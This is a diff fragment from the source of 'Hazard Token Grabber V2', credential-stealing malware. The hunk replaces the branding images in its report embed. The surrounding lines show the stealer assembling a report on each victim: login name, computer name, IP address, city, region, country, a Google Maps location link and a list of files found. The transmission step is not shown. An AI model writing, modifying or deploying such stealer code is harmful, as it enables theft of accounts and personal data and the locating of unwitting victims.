@@ -306,19 +306,19 @@ class Hazard_Token_Grabber_V2:
             n+= len(files)
             self.fileCount = f"{n} Files Found: "
         embed = {
-            "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
+            "avatar_url":"https://i.ibb.co/LrYmL9w/Sans-titre-1.png",
             "embeds": [
                 {
                     "author": {
                         "name": "Hazard Token Grabber.V2",
                         "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
+                        "icon_url": "https://i.ibb.co/LrYmL9w/Sans-titre-1.png"
                     },
                     "description": f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 16119101,
 
                     "thumbnail": {
-                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
+                      "url": "https://i.ibb.co/LrYmL9w/Sans-titre-1.png"
                     },       
 
                     "footer": {
